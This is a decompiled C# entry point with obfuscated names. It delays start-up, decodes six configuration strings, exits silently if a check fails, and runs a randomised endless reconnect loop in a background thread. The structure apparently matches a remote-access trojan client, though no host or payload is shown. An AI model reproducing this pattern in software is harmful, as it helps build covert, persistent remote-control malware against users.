using System;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0
{
	// Token: 0x02000008 RID: 8
	public class GClass1
	{
		// Token: 0x06000018 RID: 24 RVA: 0x0000474C File Offset: 0x0000294C
		[STAThread]
		public static void Main()
		{
			Thread.Sleep(checked(GClass0.int_0 * 1000));
			try
			{
				GClass0.string_0 = Conversions.ToString(GClass6.smethod_0(GClass0.string_0));
				GClass0.string_2 = Conversions.ToString(GClass6.smethod_0(GClass0.string_2));
				GClass0.string_3 = Conversions.ToString(GClass6.smethod_0(GClass0.string_3));
				GClass0.string_4 = Conversions.ToString(GClass6.smethod_0(GClass0.string_4));
				GClass0.string_5 = Conversions.ToString(GClass6.smethod_0(GClass0.string_5));
				GClass0.string_6 = Conversions.ToString(GClass6.smethod_0(GClass0.string_6));
			}
			catch (Exception ex)
			{
				Environment.Exit(0);
			}
			if (!Class6.smethod_16())
			{
				Environment.Exit(0);
			}
			Class6.smethod_4();
			new Thread(new ThreadStart(GClass1._Lambda$__1)).Start();
			Thread thread = new Thread(new ThreadStart(GClass1._Lambda$__2));
			Thread thread2 = new Thread(new ThreadStart(GClass1._Lambda$__3));
			thread.Start();
			thread2.Start();
			thread2.Join();
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002342 File Offset: 0x00000542
		private static void _Lambda$__1()
		{
			GClass5.smethod_0();
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002349 File Offset: 0x00000549
		private static void _Lambda$__2()
		{
			Class6.smethod_3();
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00002351 File Offset: 0x00000551
		private static void _Lambda$__3()
		{
			for (;;)
			{
				Thread.Sleep(new Random().Next(3000, 10000));
				if (!GClass2.bool_0)
				{
					GClass2.smethod_14();
					GClass2.smethod_0();
				}
				GClass2.manualResetEvent_0.WaitOne();
			}
		}
	}
}
